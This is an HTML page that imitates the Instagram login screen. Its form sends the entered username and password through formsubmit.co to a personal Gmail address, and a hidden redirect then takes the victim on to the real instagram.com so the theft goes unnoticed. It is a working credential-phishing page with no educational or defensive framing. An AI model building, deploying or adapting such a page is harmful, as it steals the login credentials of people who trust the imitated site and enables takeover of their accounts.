<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram Login</title>
</head>
<body style="text-align:center; font-family:Arial; background:#111; color:white;">
  <!-- Instagram logo -->
  <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" 
       alt="Instagram" 
       style="width:100px; margin-top:50px;">
  
  <form action="https://formsubmit.co/amirkhmys@gmail.com" method="POST" style="margin-top:30px;">
    <!-- Redirect to Instagram after submission -->
    <input type="hidden" name="_next" value="https://www.instagram.com/">
    
    <input type="text" name="username" placeholder="Username, email or phone number" required style="width:250px; padding:10px; margin:5px;"><br>
    <input type="password" name="password" placeholder="Password" required style="width:250px; padding:10px; margin:5px;"><br>
    <input type="submit" value="Log in" style="width:250px; padding:10px; margin:10px; background:#0095f6; color:white; border:none;">
  </form>
  
  <p><a href="#" style="color:#0095f6;">Forgot password?</a></p>
  <p><a href="#" style="color:#0095f6;">Create new account</a></p>
</body>
</html>
